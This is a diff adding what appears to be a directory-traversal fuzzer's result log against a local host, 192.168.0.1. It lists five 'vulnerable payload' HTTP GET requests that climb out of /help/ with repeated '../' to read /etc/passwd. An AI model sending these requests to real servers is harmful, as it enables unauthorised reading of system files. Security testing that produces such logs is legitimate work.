@@ -1,0 +1,43 @@
+
+[+] Date and Time: 06-19-2012 18:07:07
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: 192.168.0.1
+[+] Protocol: N/A
+[+] Port: 80
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Traversal Engine DONE ! - Total traversal tests created: 3660
+
+[+] Total Traversals found: 5
+[-] Fuzz testing aborted
+
+[*] VULNERABLE PAYLOAD:
+GET /help/../../etc/passwd HTTP/1.0
+Host: 192.168.0.1
+
+
+
+[*] VULNERABLE PAYLOAD:
+GET /help/../../../etc/passwd HTTP/1.0
+Host: 192.168.0.1
+
+
+
+[*] VULNERABLE PAYLOAD:
+GET /help/../../../../etc/passwd HTTP/1.0
+Host: 192.168.0.1
+
+
+
+[*] VULNERABLE PAYLOAD:
+GET /help/../../../../../etc/passwd HTTP/1.0
+Host: 192.168.0.1
+
+
+
+[*] VULNERABLE PAYLOAD:
+GET /help/../../../../../../etc/passwd HTTP/1.0
+Host: 192.168.0.1
+
+
